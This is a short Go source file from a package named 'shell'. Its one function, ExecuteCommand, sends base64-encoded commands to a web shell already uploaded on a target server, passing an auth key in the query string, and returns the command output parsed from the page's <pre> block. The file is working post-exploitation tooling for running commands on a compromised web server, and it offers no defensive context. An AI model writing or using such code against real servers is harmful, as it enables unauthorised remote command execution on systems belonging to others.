package shell

import (
	"encoding/base64"
	"fmt"
	"html"
	"io"
	"net/http"
	"strings"
)

// ExecuteCommand sends a command to an uploaded web shell and returns the output.
func ExecuteCommand(target, webShell, authKey, command string, client http.Client) (string, error) {
	encodedString := base64.StdEncoding.EncodeToString([]byte(command))
	requestTarget := target + webShell + "?key=" + authKey + "&cmd=" + encodedString

	resp, err := client.Get(requestTarget)
	if err != nil {
		return "", fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("reading response: %w", err)
	}
	bodyString := string(bodyBytes)

	lower := strings.ToLower(bodyString)
	preStart := strings.Index(lower, "<pre>")
	preEnd := strings.Index(lower, "</pre>")

	if preStart == -1 || preEnd == -1 || preEnd <= preStart {
		return "", fmt.Errorf("unexpected response from web shell")
	}

	output := html.UnescapeString(bodyString[preStart+len("<pre>") : preEnd])
	if output == "" {
		return "[no output]", nil
	}
	return output, nil
}
